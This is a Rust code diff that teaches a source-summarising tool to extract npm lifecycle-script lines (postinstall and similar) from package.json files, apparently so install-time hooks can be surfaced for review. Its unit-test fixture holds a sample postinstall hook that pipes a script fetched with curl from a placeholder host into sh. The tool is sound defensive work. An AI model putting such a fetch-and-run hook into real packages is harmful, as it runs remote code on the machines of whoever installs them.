@@ -9,6 +9,7 @@ pub enum Lang {
     Python,
     Go,
     JavaScript,
+    PackageJson,
     TypeScript,
     Tsx,
     Html,
@@ -37,6 +38,7 @@ impl Lang {
         match p.file_name().and_then(|n| n.to_str()) {
             Some("Dockerfile" | "Containerfile") => return Some(Lang::Dockerfile),
             Some("Gemfile" | "Rakefile") => return Some(Lang::Ruby),
+            Some("package.json") => return Some(Lang::PackageJson),
             _ => {}
         }
         match p.extension().and_then(|e| e.to_str()) {
@@ -74,6 +76,7 @@ impl Lang {
             Lang::Python => tree_sitter_python::LANGUAGE.into(),
             Lang::Go => tree_sitter_go::LANGUAGE.into(),
             Lang::JavaScript => tree_sitter_javascript::LANGUAGE.into(),
+            Lang::PackageJson => tree_sitter_javascript::LANGUAGE.into(),
             Lang::TypeScript => tree_sitter_typescript::LANGUAGE_TYPESCRIPT.into(),
             Lang::Tsx => tree_sitter_typescript::LANGUAGE_TSX.into(),
             Lang::Html => tree_sitter_html::LANGUAGE.into(),
@@ -104,6 +107,7 @@ impl Lang {
             Lang::Python => "python",
             Lang::Go => "go",
             Lang::JavaScript => "javascript",
+            Lang::PackageJson => "package-json",
             Lang::TypeScript => "typescript",
             Lang::Tsx => "tsx",
             Lang::Html => "html",
@@ -153,6 +157,9 @@ pub struct AstLocation {
 /// Parse failures return None or partial summaries; ASTs are dropped after extraction.
 pub fn dehydrate(path: &Path, src: &[u8]) -> Option<AstSummary> {
     let lang = Lang::from_path(path)?;
+    if lang == Lang::PackageJson {
+        return Some(dehydrate_package_json(path, src));
+    }
     let mut parser = Parser::new();
     if parser.set_language(&lang.ts()).is_err() {
         return None;
@@ -172,6 +179,52 @@ pub fn dehydrate(path: &Path, src: &[u8]) -> Option<AstSummary> {
     sum.locations.dedup();
     dedup(&mut sum.external);
     Some(sum)
+}
+
+fn dehydrate_package_json(path: &Path, src: &[u8]) -> AstSummary {
+    let mut sum = AstSummary {
+        path: path.display().to_string(),
+        lang: Some(Lang::PackageJson.label()),
+        ..Default::default()
+    };
+    let text = String::from_utf8_lossy(src);
+    for (idx, line) in text.lines().enumerate() {
+        let trimmed = line.trim();
+        if trimmed.starts_with("\"scripts\"") {
+            sum.signatures.push(trimmed.chars().take(140).collect());
+            sum.locations.push(AstLocation {
+                kind: "signature",
+                line: idx + 1,
+                text: trimmed.chars().take(140).collect(),
+            });
+            continue;
+        }
+        if is_npm_lifecycle_script_line(trimmed) {
+            let text: String = trimmed.chars().take(140).collect();
+            sum.calls.push(text.clone());
+            sum.locations.push(AstLocation {
+                kind: "call",
+                line: idx + 1,
+                text,
+            });
+        }
+    }
+    dedup(&mut sum.signatures);
+    dedup(&mut sum.calls);
+    sum
+}
+
+fn is_npm_lifecycle_script_line(line: &str) -> bool {
+    [
+        "preinstall",
+        "install",
+        "postinstall",
+        "prepare",
+        "prepack",
+        "postpack",
+    ]
+    .iter()
+    .any(|key| line.contains(&format!("\"{key}\"")) && line.contains(':'))
 }
 
 fn first_line(node: Node, src: &[u8]) -> Option<String> {
@@ -240,7 +293,7 @@ fn is_import_node(lang: Lang, kind: &str) -> bool {
         Lang::Rust => kind == "use_declaration",
         Lang::Python => matches!(kind, "import_statement" | "import_from_statement"),
         Lang::Go => kind == "import_declaration",
-        Lang::JavaScript | Lang::TypeScript | Lang::Tsx => {
+        Lang::JavaScript | Lang::PackageJson | Lang::TypeScript | Lang::Tsx => {
             matches!(kind, "import_statement" | "export_statement")
         }
         Lang::Dart => matches!(
@@ -286,7 +339,7 @@ fn is_signature_node(lang: Lang, kind: &str) -> bool {
             kind,
             "function_declaration" | "method_declaration" | "type_declaration"
         ),
-        Lang::JavaScript | Lang::TypeScript | Lang::Tsx => matches!(
+        Lang::JavaScript | Lang::PackageJson | Lang::TypeScript | Lang::Tsx => matches!(
             kind,
             "function_declaration"
                 | "generator_function_declaration"
@@ -398,7 +451,7 @@ fn is_call_node(lang: Lang, kind: &str) -> bool {
         Lang::Rust | Lang::Go => kind == "call_expression",
         Lang::Zig => matches!(kind, "call_expression" | "builtin_function"),
         Lang::Python => kind == "call",
-        Lang::JavaScript | Lang::TypeScript | Lang::Tsx => {
+        Lang::JavaScript | Lang::PackageJson | Lang::TypeScript | Lang::Tsx => {
             matches!(kind, "call_expression" | "new_expression")
         }
         Lang::Dart
@@ -521,6 +574,27 @@ function main() {
         assert!(r.signatures.iter().any(|i| i.contains("function main")));
         assert!(r.calls.iter().any(|c| c.contains("fetch")));
         assert!(r.calls.iter().any(|c| c.contains("thing")));
+    }
+
+    #[test]
+    fn package_json_extracts_lifecycle_scripts() {
+        let s = br#"{
+  "scripts": {
+    "test": "node test.js",
+    "postinstall": "curl https://example.invalid/install.sh | sh"
+  }
+}
+"#;
+        let r = dehydrate(&PathBuf::from("package.json"), s).unwrap_or_default();
+        assert_eq!(r.lang, Some("package-json"));
+        assert!(r.signatures.iter().any(|i| i.contains("\"scripts\"")));
+        assert!(r.calls.iter().any(|c| c.contains("postinstall")));
+        assert!(
+            r.locations
+                .iter()
+                .any(|l| l.line == 4 && l.text.contains("postinstall"))
+        );
+        assert!(!r.calls.iter().any(|c| c.contains("\"test\"")));
     }
 
     #[test]
